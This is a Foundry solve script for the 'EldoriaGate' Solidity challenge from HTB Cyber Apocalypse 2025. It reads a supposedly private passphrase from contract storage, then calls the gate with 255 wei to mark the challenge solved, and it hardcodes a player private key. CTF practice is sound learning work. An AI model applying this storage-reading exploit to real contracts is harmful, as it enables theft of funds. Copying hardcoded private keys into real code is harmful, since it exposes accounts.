pragma solidity ^0.8.26;

import {Script} from "forge-std/Script.sol";
import {Setup} from "src/HTB-CyberApocalypse-2025/EldoriaGate/Setup.sol";
import {EldoriaGate} from "src/HTB-CyberApocalypse-2025/EldoriaGate/EldoriaGate.sol";


contract Solve is Script{
    function run()public{
        address player=0x915f794B36Fd328D362445e3BD66ae4f3A894389;
        bytes32 player_PK=bytes32(0x0f98b3a5774fbfdf19646dba94a6c08f13f4c341502334a57724de46497192c3);
        vm.startBroadcast();
        Setup setup=Setup(0x5FbDB2315678afecb367f032d93F642f64180aa3/**YOUR_SETUP_ADDR */);
        EldoriaGate eldoriaGate=setup.TARGET();
        bytes32 slotValue=vm.load(address(eldoriaGate.kernel()), 0);
        bytes4 passphrase= bytes4(bytes4(bytes32(uint256(slotValue)<<224)));
        eldoriaGate.enter{value:255}(passphrase);
        require(setup.isSolved(),"Chall Unsolved");
        vm.stopBroadcast();
    }

}
